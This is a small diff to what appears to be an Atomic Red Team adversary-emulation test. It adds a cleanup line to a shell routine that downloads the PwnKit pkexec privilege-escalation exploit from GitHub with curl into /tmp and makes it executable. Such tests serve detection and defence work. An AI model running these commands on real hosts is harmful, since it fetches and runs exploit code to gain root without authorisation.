@@ -16,6 +16,7 @@ atomic_tests:
     executor:
       name: sh
       command: |-
+        rm -r /tmp/.pkexec || :
         cd /tmp
         test -f PwnKit || curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
         chmod +x ./PwnKit || exit
